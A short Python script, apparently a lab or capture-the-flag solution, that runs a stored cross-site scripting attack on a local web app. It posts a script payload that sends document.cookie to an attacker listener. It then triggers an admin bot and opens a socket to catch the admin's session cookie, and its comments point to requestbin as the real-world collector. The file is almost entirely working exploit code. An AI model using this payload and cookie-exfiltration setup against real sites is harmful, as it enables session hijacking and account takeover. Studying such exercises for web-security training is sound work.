import requests
import socket

# 1. Create requestbin somewhere
##   E.g. https://requestbin.com/
###  I will just open socket on localhost/

sock = socket.socket()

# 2. Send malicious payload
##   We need to fetch document.cookie
###  And send to requestbin via query param

payload = """
	<script>
		document.location = "http://localhost:12345?q=" + document.cookie;
		// you will have address to requestbin instead
	</script>
""" 

r = requests.post("http://localhost:8000/", data={"text": payload})

# 3. Just wait until the admin open your issue
##   And you will be able to catch his cookie
###  I'll trigger it by my own secret endpoint

try:
	r = requests.get("http://localhost:8000/secret_endpoint/start_admin_bot", timeout=1)
except:
	pass # exit by timeout

sock.bind(('', 12345))
sock.listen()

# just wait for it...
conn, addr = sock.accept()
while True:
	data = conn.recv(1024)
	if not data:
		break

	print(data.decode())

conn.close()

sock.close()